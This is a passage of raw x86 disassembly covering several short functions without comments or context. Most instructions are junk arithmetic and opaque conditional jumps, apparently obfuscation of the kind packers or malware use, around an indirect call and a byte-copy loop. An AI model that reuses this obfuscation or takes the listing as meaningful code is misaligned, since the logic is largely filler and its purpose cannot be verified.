  41cbb8:	jne    0x41cc3e
  41cbbe:	mov    ebx,DWORD PTR [ebp-0x24]
  41cbc1:	cmp    ebx,DWORD PTR [ebp-0xc]
  41cbc4:	jne    0x41cc3e
  41cbc6:	and    ebx,edx
  41cbc8:	mov    edx,DWORD PTR [ebp-0x24]
  41cbcb:	xor    DWORD PTR [ebp-0x24],esi
  41cbce:	mov    DWORD PTR [ebp-0x24],ecx
  41cbd1:	sub    DWORD PTR [ebp-0x24],edi
  41cbd4:	mov    edi,DWORD PTR [ebp-0x24]
  41cbd7:	mov    DWORD PTR [ebp-0x44],ebx
  41cbda:	cmp    edx,eax
  41cbdc:	jne    0x41cc3e
  41cbde:	mov    ecx,DWORD PTR [ebp-0x24]
  41cbe1:	and    DWORD PTR [ebp-0x24],edx
  41cbe4:	mov    ebx,DWORD PTR [ebp-0x24]
  41cbe7:	cmp    ecx,edx
  41cbe9:	jne    0x41cc3e
  41cbeb:	add    ecx,edx
  41cbed:	mov    edx,DWORD PTR [ebp-0x24]
  41cbf0:	add    DWORD PTR [ebp-0x24],edi
  41cbf3:	or     DWORD PTR [ebp-0x44],ecx
  41cbf6:	cmp    edi,DWORD PTR [ebp-0x44]
  41cbf9:	jne    0x41cc3e
  41cbfb:	cmp    edi,esi
  41cbfd:	je     0x41cc3e
  41cbff:	sub    edx,eax
  41cc01:	add    edx,edx
  41cc03:	sub    DWORD PTR [ebp-0x24],ebx
  41cc06:	cmp    edx,DWORD PTR ds:0x459978
  41cc0c:	jne    0x41cc3e
  41cc0e:	mov    ecx,DWORD PTR [ebp-0x24]
  41cc11:	sub    DWORD PTR [ebp-0x44],edx
  41cc14:	mov    edx,0x55
  41cc19:	sub    edx,ebx
  41cc1b:	add    DWORD PTR [ebp-0x44],edx
  41cc1e:	sub    DWORD PTR [ebp-0x44],edi
  41cc21:	sub    ecx,ebx
  41cc23:	sub    ecx,esi
  41cc25:	and    ecx,esi
  41cc27:	cmp    ecx,edx
  41cc29:	je     0x41cc3e
  41cc2b:	test   edi,0x9404
  41cc31:	je     0x41cc3e
  41cc33:	mov    esi,0x1e98
  41cc38:	add    DWORD PTR [ebp-0x44],ecx
  41cc3b:	sub    DWORD PTR [ebp-0x24],esi
  41cc3e:	mov    edx,0xd586adc5
  41cc43:	sub    DWORD PTR [ebp-0x24],ebx
  41cc46:	add    edx,0x2a79823b
  41cc4c:	mov    ecx,DWORD PTR ds:0x459978
  41cc52:	or     DWORD PTR [ebp-0x24],ecx
  41cc55:	push   edx
  41cc56:	mov    ebx,DWORD PTR [ebp-0x24]
  41cc59:	mov    eax,0xe795
  41cc5e:	sub    eax,ebx
  41cc60:	sub    DWORD PTR [ebp-0x24],eax
  41cc63:	push   0x567a5
  41cc68:	mov    edi,0xa8
  41cc6d:	mov    edx,esi
  41cc6f:	sub    DWORD PTR [ebp-0x24],esi
  41cc72:	sub    DWORD PTR [ebp-0x24],edx
  41cc75:	sub    edi,edx
  41cc77:	sub    edi,eax
  41cc79:	xor    DWORD PTR [ebp-0x24],edi
  41cc7c:	push   0x0
  41cc7e:	sub    DWORD PTR [ebp-0x24],edi
  41cc81:	mov    edi,0x4dca6345
  41cc86:	mov    edx,DWORD PTR [ebp-0x24]
  41cc89:	mov    eax,0xe8
  41cc8e:	and    edx,ecx
  41cc90:	and    edx,esi
  41cc92:	and    edx,eax
  41cc94:	sub    edx,ecx
  41cc96:	sub    DWORD PTR [ebp-0x24],ebx
  41cc99:	cmp    edx,edi
  41cc9b:	jne    0x41cccf
  41cc9d:	cmp    edx,0xffffffad
  41cca0:	jne    0x41cccf
  41cca2:	mov    eax,DWORD PTR [ebp-0x24]
  41cca5:	mov    ebx,DWORD PTR ds:0x459978
  41ccab:	and    ebx,edi
  41ccad:	add    eax,edi
  41ccaf:	sub    DWORD PTR [ebp-0x24],edx
  41ccb2:	add    eax,edx
  41ccb4:	cmp    edx,0xffffff9e
  41ccb7:	jne    0x41cccf
  41ccb9:	sub    ebx,eax
  41ccbb:	cmp    ebx,DWORD PTR [ebp-0x2c]
  41ccbe:	je     0x41cccf
  41ccc0:	mov    esi,DWORD PTR [ebp-0x24]
  41ccc3:	mov    edx,0x93
  41ccc8:	sub    ebx,edx
  41ccca:	add    esi,ebx
  41cccc:	add    DWORD PTR [ebp-0x24],esi
  41cccf:	sub    edi,0x4d84beb9
  41ccd5:	cmp    esi,DWORD PTR [ebp-0x24]
  41ccd8:	jne    0x41cd26
  41ccda:	add    eax,eax
  41ccdc:	mov    ecx,DWORD PTR [ebp-0x24]
  41ccdf:	mov    ebx,0x1a
  41cce4:	cmp    eax,DWORD PTR [ebp-0x28]
  41cce7:	je     0x41cd26
  41cce9:	sub    DWORD PTR [ebp-0x24],ebx
  41ccec:	mov    esi,DWORD PTR [ebp-0x24]
  41ccef:	sub    ecx,edx
  41ccf1:	mov    edx,DWORD PTR [ebp-0x24]
  41ccf4:	add    eax,ecx
  41ccf6:	cmp    edx,edi
  41ccf8:	je     0x41cd26
  41ccfa:	and    esi,ebx
  41ccfc:	mov    ebx,DWORD PTR [ebp-0x24]
  41ccff:	cmp    eax,DWORD PTR ds:0x459978
  41cd05:	jne    0x41cd26
  41cd07:	or     DWORD PTR [ebp-0x24],ebx
  41cd0a:	mov    ecx,0xf8
  41cd0f:	mov    ebx,DWORD PTR ds:0x459978
  41cd15:	or     DWORD PTR [ebp-0x24],ebx
  41cd18:	xor    DWORD PTR [ebp-0x24],esi
  41cd1b:	add    DWORD PTR [ebp-0x24],edx
  41cd1e:	sub    DWORD PTR [ebp-0x24],eax
  41cd21:	add    ecx,edx
  41cd23:	add    DWORD PTR [ebp-0x24],ecx
  41cd26:	call   DWORD PTR [edi]
  41cd28:	cmp    eax,esi
  41cd2a:	jne    0x41cd43
  41cd2c:	mov    esi,DWORD PTR [ebp-0x24]
  41cd2f:	mov    ebx,DWORD PTR [ebp-0x24]
  41cd32:	sub    DWORD PTR [ebp-0x24],ebx
  41cd35:	and    esi,edi
  41cd37:	add    esi,eax
  41cd39:	cmp    eax,ebx
  41cd3b:	jne    0x41cd43
  41cd3d:	or     DWORD PTR [ebp-0x24],ebx
  41cd40:	sub    DWORD PTR [ebp-0x24],esi
  41cd43:	mov    DWORD PTR [ebp-0x3c],eax
  41cd46:	mov    edi,DWORD PTR ds:0x459978
  41cd4c:	mov    edx,DWORD PTR ds:0x459978
  41cd52:	add    ebx,ebx
  41cd54:	cmp    esi,edx
  41cd56:	jne    0x41cd7d
  41cd58:	test   ebx,0xa4
  41cd5e:	jne    0x41cd7d
  41cd60:	cmp    eax,0x3bc8
  41cd65:	je     0x41cd7d
  41cd67:	mov    esi,0xd3
  41cd6c:	mov    edi,0x7f
  41cd71:	sub    esi,edx
  41cd73:	add    edi,ebx
  41cd75:	and    esi,edx
  41cd77:	mov    DWORD PTR [ebp-0x24],edi
  41cd7a:	add    DWORD PTR [ebp-0x24],esi
  41cd7d:	mov    esi,0x6b6884bd
  41cd82:	add    DWORD PTR [ebp-0x24],eax
  41cd85:	add    esi,0x94d91d9b
  41cd8b:	sub    DWORD PTR [ebp-0x24],esi
  41cd8e:	mov    DWORD PTR [ebp-0x34],esi
  41cd91:	cmp    ebx,edx
  41cd93:	je     0x41cd98
  41cd95:	sub    DWORD PTR [ebp-0x24],eax
  41cd98:	mov    edi,DWORD PTR [ebp-0x3c]
  41cd9b:	cmp    eax,0x11
  41cd9e:	jne    0x41cda3
  41cda0:	add    DWORD PTR [ebp-0x24],edi
  41cda3:	and    edx,ebx
  41cda5:	add    DWORD PTR [ebp-0x24],edi
  41cda8:	cmp    edx,0xffffffaa
  41cdab:	je     0x41ce4f
  41cdb1:	add    edx,esi
  41cdb3:	mov    esi,DWORD PTR [ebp-0x24]
  41cdb6:	cmp    edx,0x2796
  41cdbc:	jne    0x41ce4f
  41cdc2:	mov    ecx,DWORD PTR ds:0x459978
  41cdc8:	cmp    edi,DWORD PTR ds:0x459978
  41cdce:	je     0x41ce4f
  41cdd0:	mov    ebx,DWORD PTR ds:0x459978
  41cdd6:	mov    eax,DWORD PTR [ebp-0x24]
  41cdd9:	add    DWORD PTR [ebp-0x24],esi
  41cddc:	add    edx,ecx
  41cdde:	cmp    eax,esi
  41cde0:	jne    0x41ce4f
  41cde2:	add    DWORD PTR [ebp-0x24],eax
  41cde5:	cmp    edx,0xffffff89
  41cde8:	je     0x41ce4f
  41cdea:	mov    esi,0x51
  41cdef:	sub    edx,eax
  41cdf1:	cmp    edi,eax
  41cdf3:	jne    0x41ce4f
  41cdf5:	cmp    edx,0x44de
  41cdfb:	je     0x41ce4f
  41cdfd:	mov    eax,DWORD PTR ds:0x459954
  41ce03:	add    DWORD PTR [ebp-0x24],esi
  41ce06:	mov    ebx,DWORD PTR [ebp-0x24]
  41ce09:	add    DWORD PTR [ebp-0x24],ebx
  41ce0c:	add    edx,esi
  41ce0e:	sub    edx,ebx
  41ce10:	cmp    ebx,DWORD PTR ds:0x459954
  41ce16:	je     0x41ce2d
  41ce18:	mov    esi,DWORD PTR [ebp-0x24]
  41ce1b:	cmp    esi,DWORD PTR ds:0x459954
  41ce21:	jne    0x41ce2d
  41ce23:	and    esi,ebx
  41ce25:	sub    edx,edi
  41ce27:	sub    DWORD PTR [ebp-0x24],edx
  41ce2a:	sub    DWORD PTR [ebp-0x24],esi
  41ce2d:	or     eax,ebx
  41ce2f:	cmp    eax,0xffffffa6
  41ce32:	je     0x41ce4f
  41ce34:	mov    edx,0xef
  41ce39:	mov    ebx,0x2
  41ce3e:	mov    DWORD PTR [ebp-0x24],ebx
  41ce41:	sub    eax,edx
  41ce43:	test   eax,0xc9
  41ce48:	jne    0x41ce4f
  41ce4a:	sub    eax,edi
  41ce4c:	add    DWORD PTR [ebp-0x24],eax
  41ce4f:	mov    eax,DWORD PTR [ebp-0x34]
  41ce52:	add    ecx,esi
  41ce54:	mov    esi,0x4e0
  41ce59:	add    esi,ecx
  41ce5b:	cmp    esi,0xe37a
  41ce61:	je     0x41cec3
  41ce63:	mov    ecx,ebx
  41ce65:	add    ecx,eax
  41ce67:	cmp    ecx,DWORD PTR [ebp-0x10]
  41ce6a:	jne    0x41cec3
  41ce6c:	cmp    esi,DWORD PTR ds:0x459978
  41ce72:	je     0x41cec3
  41ce74:	add    esi,eax
  41ce76:	and    ecx,edx
  41ce78:	xor    DWORD PTR [ebp-0x24],eax
  41ce7b:	add    DWORD PTR [ebp-0x24],ecx
  41ce7e:	and    esi,ecx
  41ce80:	cmp    esi,DWORD PTR ds:0x459954
  41ce86:	jne    0x41cec3
  41ce88:	mov    ecx,edx
  41ce8a:	or     esi,ebx
  41ce8c:	add    esi,ebx
  41ce8e:	sub    DWORD PTR [ebp-0x24],ecx
  41ce91:	cmp    esi,0x76
  41ce94:	je     0x41cec3
  41ce96:	mov    ecx,0x8a5a
  41ce9b:	add    DWORD PTR [ebp-0x24],ecx
  41ce9e:	sub    esi,edx
  41cea0:	cmp    esi,edx
  41cea2:	je     0x41cec3
  41cea4:	cmp    esi,DWORD PTR ds:0x459954
  41ceaa:	je     0x41cec3
  41ceac:	mov    ecx,DWORD PTR [ebp-0x24]
  41ceaf:	sub    DWORD PTR [ebp-0x24],esi
  41ceb2:	add    ecx,ecx
  41ceb4:	sub    ecx,edx
  41ceb6:	add    ecx,ebx
  41ceb8:	add    ecx,eax
  41ceba:	add    ecx,esi
  41cebc:	sub    ecx,edi
  41cebe:	add    ecx,eax
  41cec0:	add    DWORD PTR [ebp-0x24],ecx
  41cec3:	mov    esi,DWORD PTR [eax]
  41cec5:	add    ecx,esi
  41cec7:	add    ecx,eax
  41cec9:	cmp    ecx,0x4d
  41cecc:	jne    0x41cee6
  41cece:	test   ecx,0x99
  41ced4:	je     0x41cee6
  41ced6:	cmp    ecx,DWORD PTR [ebp-0x18]
  41ced9:	je     0x41cee6
  41cedb:	cmp    ecx,0xc6a8
  41cee1:	jne    0x41cee6
  41cee3:	or     DWORD PTR [ebp-0x24],ecx
  41cee6:	mov    ecx,DWORD PTR [eax+0x4]
  41cee9:	or     esi,esi
  41ceeb:	je     0x41cef8
  41ceed:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ceef:	add    DWORD PTR [ebp-0x34],0x8
  41cef3:	jmp    0x41cd9b
  41cef8:	mov    eax,DWORD PTR [ebp-0x24]
  41cefb:	sub    DWORD PTR [ebp-0x24],ecx
  41cefe:	sub    DWORD PTR [ebp-0x24],eax
  41cf01:	mov    edi,0x22
  41cf06:	and    DWORD PTR [ebp-0x24],edi
  41cf09:	mov    eax,DWORD PTR [ebp-0x3c]
  41cf0c:	cmp    eax,0x31
  41cf0f:	je     0x41cf66
  41cf11:	mov    edx,DWORD PTR [ebp-0x24]
  41cf14:	mov    edi,eax
  41cf16:	and    edx,eax
  41cf18:	add    edi,edi
  41cf1a:	sub    DWORD PTR [ebp-0x24],edi
  41cf1d:	cmp    eax,edi
  41cf1f:	je     0x41cf66
  41cf21:	mov    ebx,DWORD PTR [ebp-0x24]
  41cf24:	cmp    ebx,DWORD PTR ds:0x459978
  41cf2a:	jne    0x41cf66
  41cf2c:	and    ebx,edi
  41cf2e:	sub    edx,eax
  41cf30:	mov    esi,0xf3
  41cf35:	mov    ecx,0xcf37
  41cf3a:	add    DWORD PTR [ebp-0x24],ecx
  41cf3d:	add    DWORD PTR [ebp-0x24],ebx
  41cf40:	sub    esi,edx
  41cf42:	or     esi,eax
  41cf44:	sub    DWORD PTR [ebp-0x24],eax
  41cf47:	cmp    esi,0x6d
  41cf4a:	jne    0x41cf66
  41cf4c:	add    esi,edi
  41cf4e:	add    esi,edx
  41cf50:	mov    ecx,DWORD PTR [ebp-0x24]
  41cf53:	mov    edx,DWORD PTR ds:0x459964
  41cf59:	sub    edx,ecx
  41cf5b:	add    DWORD PTR [ebp-0x24],ecx
  41cf5e:	sub    DWORD PTR [ebp-0x24],edx
  41cf61:	sub    esi,ebx
  41cf63:	mov    DWORD PTR [ebp-0x24],esi
  41cf66:	sub    DWORD PTR [ebp-0x24],edx
  41cf69:	pop    edi
  41cf6a:	mov    esi,0x51
  41cf6f:	sub    esi,ebx
  41cf71:	sub    DWORD PTR [ebp-0x24],edi
  41cf74:	cmp    esi,ebx
  41cf76:	je     0x41cfdb
  41cf78:	or     esi,ebx
  41cf7a:	sub    esi,edx
  41cf7c:	add    esi,ecx
  41cf7e:	sub    esi,edi
  41cf80:	mov    ebx,DWORD PTR ds:0x459978
  41cf86:	sub    DWORD PTR [ebp-0x24],esi
  41cf89:	sub    ebx,eax
  41cf8b:	mov    edx,esi
  41cf8d:	add    DWORD PTR [ebp-0x24],ebx
  41cf90:	cmp    edx,DWORD PTR [ebp-0x10]
  41cf93:	je     0x41cfdb
  41cf95:	sub    DWORD PTR [ebp-0x24],esi
  41cf98:	add    edx,edx
  41cf9a:	add    edx,ecx
  41cf9c:	mov    esi,0xd3
  41cfa1:	add    esi,eax
  41cfa3:	mov    ecx,0xa
  41cfa8:	test   esi,0x27
  41cfae:	je     0x41cfcb
  41cfb0:	sub    edx,edi
  41cfb2:	cmp    edi,DWORD PTR [ebp-0x30]
  41cfb5:	jne    0x41cfcb
  41cfb7:	add    edx,esi
  41cfb9:	mov    esi,DWORD PTR [ebp-0x24]
  41cfbc:	mov    ebx,DWORD PTR [ebp-0x24]
  41cfbf:	cmp    ebx,DWORD PTR [ebp-0x48]
  41cfc2:	je     0x41cfcb
  41cfc4:	and    esi,ebx
  41cfc6:	sub    edx,esi
  41cfc8:	or     DWORD PTR [ebp-0x24],edx
  41cfcb:	cmp    edx,DWORD PTR [ebp-0x40]
  41cfce:	jne    0x41cfd8
  41cfd0:	mov    esi,0x3836
  41cfd5:	add    DWORD PTR [ebp-0x24],esi
  41cfd8:	add    DWORD PTR [ebp-0x24],ecx
  41cfdb:	pop    esi
  41cfdc:	mov    edx,DWORD PTR [ebp-0x24]
  41cfdf:	add    edx,edx
  41cfe1:	sub    edx,ebx
  41cfe3:	sub    DWORD PTR [ebp-0x24],edi
  41cfe6:	mov    ebx,DWORD PTR [ebp-0x24]
  41cfe9:	or     DWORD PTR [ebp-0x24],edx
  41cfec:	cmp    esi,DWORD PTR ds:0x459978
  41cff2:	je     0x41d049
  41cff4:	mov    edx,0xcb
  41cff9:	cmp    ebx,0xffffffeb
  41cffc:	je     0x41d049
  41cffe:	mov    ecx,DWORD PTR ds:0x459964
  41d004:	cmp    esi,DWORD PTR ds:0x459978
  41d00a:	je     0x41d049
  41d00c:	sub    ecx,eax
  41d00e:	sub    DWORD PTR [ebp-0x24],ecx
  41d011:	mov    ecx,edx
  41d013:	cmp    ebx,esi
  41d015:	jne    0x41d049
  41d017:	mov    edx,DWORD PTR [ebp-0x24]
  41d01a:	add    DWORD PTR [ebp-0x24],esi
  41d01d:	sub    ecx,eax
  41d01f:	add    DWORD PTR [ebp-0x24],ebx
  41d022:	cmp    ecx,edx
  41d024:	je     0x41d049
  41d026:	mov    ebx,DWORD PTR [ebp-0x24]
  41d029:	test   ebx,0x3b81
  41d02f:	je     0x41d049
  41d031:	add    edx,ecx
  41d033:	mov    ecx,0x33
  41d038:	xor    DWORD PTR [ebp-0x24],ebx
  41d03b:	cmp    esi,DWORD PTR ds:0x459954
  41d041:	je     0x41d049
  41d043:	mov    DWORD PTR [ebp-0x24],edx
  41d046:	sub    DWORD PTR [ebp-0x24],ecx
  41d049:	pop    ebx
  41d04a:	add    DWORD PTR [ebp-0x24],ebx
  41d04d:	leave  
  41d04e:	ret    
  41d04f:	int3   
  41d050:	int3   
  41d051:	int3   
  41d052:	int3   
  41d053:	int3   
  41d054:	push   ebp
  41d055:	mov    ebp,esp
  41d057:	sub    esp,0x28
  41d05a:	mov    ecx,0xb2
  41d05f:	mov    DWORD PTR [ebp-0x20],ecx
  41d062:	push   ebx
  41d063:	mov    eax,DWORD PTR [ebp-0x20]
  41d066:	add    DWORD PTR [ebp-0x20],eax
  41d069:	push   esi
  41d06a:	sub    DWORD PTR [ebp-0x20],ecx
  41d06d:	push   edi
  41d06e:	sub    DWORD PTR [ebp-0x20],ecx
  41d071:	sub    eax,ecx
  41d073:	mov    ebx,0xb8
  41d078:	sub    DWORD PTR [ebp-0x20],ebx
  41d07b:	mov    ebx,DWORD PTR [ebp-0x20]
  41d07e:	sub    ebx,eax
  41d080:	sub    DWORD PTR [ebp-0x20],ebx
  41d083:	cmp    eax,0xffffffef
  41d086:	jne    0x41d0b7
  41d088:	add    ebx,ebx
  41d08a:	mov    ecx,DWORD PTR [ebp-0x20]
  41d08d:	test   ebx,0xcf
  41d093:	je     0x41d0b7
  41d095:	cmp    ebx,0xffffffcb
  41d098:	je     0x41d0b7
  41d09a:	mov    edx,DWORD PTR [ebp-0x20]
  41d09d:	cmp    ecx,eax
  41d09f:	je     0x41d0b7
  41d0a1:	mov    esi,0x48
  41d0a6:	mov    eax,DWORD PTR [ebp-0x20]
  41d0a9:	add    DWORD PTR [ebp-0x20],eax
  41d0ac:	add    DWORD PTR [ebp-0x20],esi
  41d0af:	xor    DWORD PTR [ebp-0x20],edx
  41d0b2:	and    ecx,ebx
  41d0b4:	add    DWORD PTR [ebp-0x20],ecx
  41d0b7:	sub    edx,ecx
  41d0b9:	cmp    edx,0x73
  41d0bc:	jne    0x41d0d3
  41d0be:	sub    edx,ebx
  41d0c0:	test   edx,0x9e
  41d0c6:	jne    0x41d0d3
  41d0c8:	cmp    edx,0xe7ba
  41d0ce:	jne    0x41d0d3
  41d0d0:	add    DWORD PTR [ebp-0x20],edx
  41d0d3:	add    esi,esi
  41d0d5:	mov    ebx,0x1e
  41d0da:	mov    esi,0x28
  41d0df:	or     esi,eax
  41d0e1:	add    DWORD PTR [ebp-0x20],esi
  41d0e4:	and    DWORD PTR [ebp-0x20],esi
  41d0e7:	or     ebx,eax
  41d0e9:	xor    DWORD PTR [ebp-0x20],ecx
  41d0ec:	sub    DWORD PTR [ebp-0x20],ebx
  41d0ef:	sub    esi,ebx
  41d0f1:	and    esi,ecx
  41d0f3:	mov    ebx,DWORD PTR [ebp-0x20]
  41d0f6:	add    ebx,edx
  41d0f8:	and    ebx,edx
  41d0fa:	sub    DWORD PTR [ebp-0x20],ebx
  41d0fd:	or     esi,edx
  41d0ff:	mov    edi,DWORD PTR [ebp-0x20]
  41d102:	add    DWORD PTR [ebp-0x20],esi
  41d105:	and    edi,edx
  41d107:	add    DWORD PTR [ebp-0x20],edi
  41d10a:	pop    edi
  41d10b:	mov    eax,ebx
  41d10d:	mov    esi,DWORD PTR [ebp-0x20]
  41d110:	test   ecx,0x58
  41d116:	je     0x41d13e
  41d118:	cmp    edi,0xffffffc1
  41d11b:	jne    0x41d13e
  41d11d:	add    esi,ebx
  41d11f:	add    DWORD PTR [ebp-0x20],edi
  41d122:	mov    ebx,DWORD PTR ds:0x45997c
  41d128:	cmp    eax,0x47
  41d12b:	je     0x41d13e
  41d12d:	sub    ebx,ecx
  41d12f:	add    eax,ebx
  41d131:	and    DWORD PTR [ebp-0x20],esi
  41d134:	cmp    eax,0x54042422
  41d139:	je     0x41d13e
  41d13b:	add    DWORD PTR [ebp-0x20],eax
  41d13e:	pop    esi
  41d13f:	mov    ebx,DWORD PTR [ebp-0x20]
  41d142:	add    ebx,ecx
  41d144:	sub    ebx,edi
  41d146:	and    ebx,edx
  41d148:	mov    eax,DWORD PTR [ebp-0x20]
  41d14b:	sub    DWORD PTR [ebp-0x20],edx
  41d14e:	cmp    esi,0xffffffcb
  41d151:	je     0x41d1b7
  41d153:	cmp    eax,0x21
  41d156:	je     0x41d1b7
  41d158:	cmp    esi,DWORD PTR [ebp-0x28]
  41d15b:	jne    0x41d1b7
  41d15d:	sub    eax,ecx
  41d15f:	mov    edx,DWORD PTR [ebp-0x20]
  41d162:	sub    eax,edi
  41d164:	cmp    edx,0x4d42
  41d16a:	jne    0x41d1b7
  41d16c:	cmp    ebx,DWORD PTR ds:0x45997c
  41d172:	je     0x41d1b7
  41d174:	cmp    edx,0x3a
  41d177:	je     0x41d1b7
  41d179:	sub    eax,ecx
  41d17b:	add    ebx,edi
  41d17d:	and    ebx,edx
  41d17f:	test   ecx,0x2c10006a
  41d185:	je     0x41d1b7
  41d187:	mov    ecx,0x5f
  41d18c:	cmp    eax,0x41
  41d18f:	jne    0x41d1b7
  41d191:	cmp    eax,0x48
  41d194:	jne    0x41d1b7
  41d196:	cmp    esi,DWORD PTR [ebp-0x24]
  41d199:	je     0x41d1b7
  41d19b:	mov    edx,DWORD PTR [ebp-0x20]
  41d19e:	xor    DWORD PTR [ebp-0x20],ecx
  41d1a1:	add    DWORD PTR [ebp-0x20],ebx
  41d1a4:	cmp    esi,DWORD PTR [ebp-0x28]
  41d1a7:	je     0x41d1b7
  41d1a9:	cmp    esi,0x35
  41d1ac:	je     0x41d1b7
  41d1ae:	sub    DWORD PTR [ebp-0x20],eax
  41d1b1:	mov    DWORD PTR [ebp-0x20],esi
  41d1b4:	add    DWORD PTR [ebp-0x20],edx
  41d1b7:	pop    ebx
  41d1b8:	test   ebx,0x10
  41d1be:	je     0x41d1ca
  41d1c0:	mov    eax,ecx
  41d1c2:	sub    DWORD PTR [ebp-0x20],ebx
  41d1c5:	add    eax,ecx
  41d1c7:	mov    DWORD PTR [ebp-0x20],eax
  41d1ca:	leave  
  41d1cb:	ret    
  41d1cc:	int3   
  41d1cd:	int3   
  41d1ce:	int3   
  41d1cf:	int3   
  41d1d0:	int3   
  41d1d1:	push   ebp
  41d1d2:	mov    ebp,esp
  41d1d4:	sub    esp,0x40
  41d1d7:	mov    eax,0x32
  41d1dc:	mov    DWORD PTR [ebp-0x10],eax
  41d1df:	push   ebx
  41d1e0:	add    DWORD PTR [ebp-0x10],eax
  41d1e3:	push   esi
  41d1e4:	mov    esi,0xcb4a
  41d1e9:	mov    ebx,DWORD PTR [ebp-0x10]
  41d1ec:	add    DWORD PTR [ebp-0x10],ebx
  41d1ef:	sub    DWORD PTR [ebp-0x10],ebx
  41d1f2:	sub    esi,eax
  41d1f4:	sub    DWORD PTR [ebp-0x10],eax
  41d1f7:	xor    DWORD PTR [ebp-0x10],ebx
  41d1fa:	add    esi,esi
  41d1fc:	cmp    ebx,DWORD PTR [ebp-0x3c]
  41d1ff:	jne    0x41d207
  41d201:	add    DWORD PTR [ebp-0x10],eax
  41d204:	add    DWORD PTR [ebp-0x10],esi
  41d207:	push   edi
  41d208:	mov    edx,0xc2
  41d20d:	mov    DWORD PTR [ebp-0x20],edx
  41d210:	mov    edx,DWORD PTR [ebp-0x10]
  41d213:	mov    esi,DWORD PTR [ebp-0x10]
  41d216:	add    DWORD PTR [ebp-0x10],ebx
  41d219:	cmp    esi,DWORD PTR [ebp-0x3c]
  41d21c:	jne    0x41d23d
  41d21e:	sub    esi,ebx
  41d220:	and    DWORD PTR [ebp-0x20],esi
  41d223:	mov    edi,edx
  41d225:	mov    eax,0xa0
  41d22a:	sub    DWORD PTR [ebp-0x20],edx
  41d22d:	add    DWORD PTR [ebp-0x10],eax
  41d230:	test   edi,0xa2
  41d236:	je     0x41d23d
  41d238:	or     edi,eax
  41d23a:	or     DWORD PTR [ebp-0x10],edi
  41d23d:	add    ebx,ebx
  41d23f:	or     ebx,edi
  41d241:	mov    edx,0xbe
  41d246:	mov    edi,0x9c
  41d24b:	add    ebx,ebx
  41d24d:	mov    DWORD PTR [ebp-0x4],ebx
  41d250:	sub    edx,edi
  41d252:	sub    edx,edi
  41d254:	sub    edx,esi
  41d256:	add    edx,esi
  41d258:	add    DWORD PTR [ebp-0x20],edx
  41d25b:	add    DWORD PTR [ebp-0x4],edx
  41d25e:	sub    ebx,eax
  41d260:	or     ebx,edi
  41d262:	xor    DWORD PTR [ebp-0x4],ebx
  41d265:	add    DWORD PTR [ebp-0x10],eax
  41d268:	pop    edi
  41d269:	mov    ecx,0x7a
  41d26e:	add    DWORD PTR [ebp-0x4],ecx
  41d271:	pop    esi
  41d272:	add    eax,eax
  41d274:	sub    eax,esi
  41d276:	test   ebx,0x53
  41d27c:	jne    0x41d283
  41d27e:	add    eax,eax
  41d280:	xor    DWORD PTR [ebp-0x10],eax
  41d283:	pop    ebx
  41d284:	mov    edx,DWORD PTR [ebp-0x20]
  41d287:	add    edx,eax
  41d289:	sub    edx,edi
  41d28b:	mov    ecx,edi
  41d28d:	cmp    ecx,0xffffff82
  41d290:	jne    0x41d335
  41d296:	cmp    ecx,0x60
  41d299:	je     0x41d335
  41d29f:	mov    DWORD PTR [ebp-0x4],ebx
  41d2a2:	mov    eax,DWORD PTR ds:0x45995c
  41d2a8:	and    edx,eax
  41d2aa:	sub    ecx,esi
  41d2ac:	sub    ecx,edx
  41d2ae:	sub    ecx,eax
  41d2b0:	mov    eax,0xb0
  41d2b5:	cmp    ecx,0x28
  41d2b8:	je     0x41d335
  41d2ba:	sub    ecx,edi
  41d2bc:	sub    eax,esi
  41d2be:	mov    edx,edi
  41d2c0:	cmp    eax,0xc018006
  41d2c5:	je     0x41d335
  41d2c7:	sub    DWORD PTR [ebp-0x10],ecx
  41d2ca:	mov    ecx,DWORD PTR [ebp-0x20]
  41d2cd:	add    DWORD PTR [ebp-0x4],edx
  41d2d0:	cmp    eax,DWORD PTR ds:0x45995c
  41d2d6:	je     0x41d335
  41d2d8:	sub    eax,ebx
  41d2da:	sub    DWORD PTR [ebp-0x10],esi
  41d2dd:	mov    edx,0xd6
  41d2e2:	cmp    ecx,DWORD PTR ds:0x45995c
  41d2e8:	je     0x41d335
  41d2ea:	cmp    ecx,eax
  41d2ec:	je     0x41d335
  41d2ee:	cmp    ebx,0x42
  41d2f1:	jne    0x41d335
  41d2f3:	xor    DWORD PTR [ebp-0x20],ecx
  41d2f6:	mov    ecx,DWORD PTR [ebp-0x4]
  41d2f9:	sub    edx,ebx
  41d2fb:	mov    DWORD PTR [ebp-0x4],eax
  41d2fe:	and    ecx,eax
  41d300:	cmp    eax,ebx
  41d302:	je     0x41d335
  41d304:	mov    eax,DWORD PTR ds:0x4599a0
  41d30a:	cmp    ecx,0x5e
  41d30d:	je     0x41d335
  41d30f:	or     DWORD PTR [ebp-0x4],edx
  41d312:	add    eax,edi
  41d314:	sub    eax,edi
  41d316:	mov    edx,DWORD PTR [ebp-0x10]
  41d319:	and    ecx,eax
  41d31b:	mov    eax,DWORD PTR [ebp-0x20]
  41d31e:	add    DWORD PTR [ebp-0x20],eax
  41d321:	add    DWORD PTR [ebp-0x20],ecx
  41d324:	cmp    edx,DWORD PTR [ebp-0x30]
  41d327:	je     0x41d335
  41d329:	mov    eax,DWORD PTR [ebp-0x4]
  41d32c:	and    DWORD PTR [ebp-0x20],ecx
  41d32f:	add    DWORD PTR [ebp-0x10],eax
  41d332:	and    DWORD PTR [ebp-0x20],edx
  41d335:	leave  
  41d336:	ret    
  41d337:	int3   
  41d338:	int3   
  41d339:	int3   
  41d33a:	int3   
  41d33b:	int3   
  41d33c:	push   ebp
  41d33d:	mov    ebp,esp
  41d33f:	sub    esp,0x34
  41d342:	mov    edx,DWORD PTR ds:0x459988
  41d348:	add    edx,edx
  41d34a:	mov    eax,edx
  41d34c:	mov    DWORD PTR [ebp-0x1c],eax
  41d34f:	push   ebx
  41d350:	mov    ecx,DWORD PTR ds:0x459940
  41d356:	mov    eax,0x82
  41d35b:	add    DWORD PTR [ebp-0x1c],eax
  41d35e:	xor    DWORD PTR [ebp-0x1c],ecx
  41d361:	push   esi
  41d362:	mov    edx,0xe1
  41d367:	add    DWORD PTR [ebp-0x1c],edx
  41d36a:	push   edi
  41d36b:	or     edx,eax
  41d36d:	mov    DWORD PTR [ebp-0x1c],edx
  41d370:	mov    edi,0xbb
  41d375:	mov    edx,DWORD PTR ds:0x459940
  41d37b:	add    eax,edi
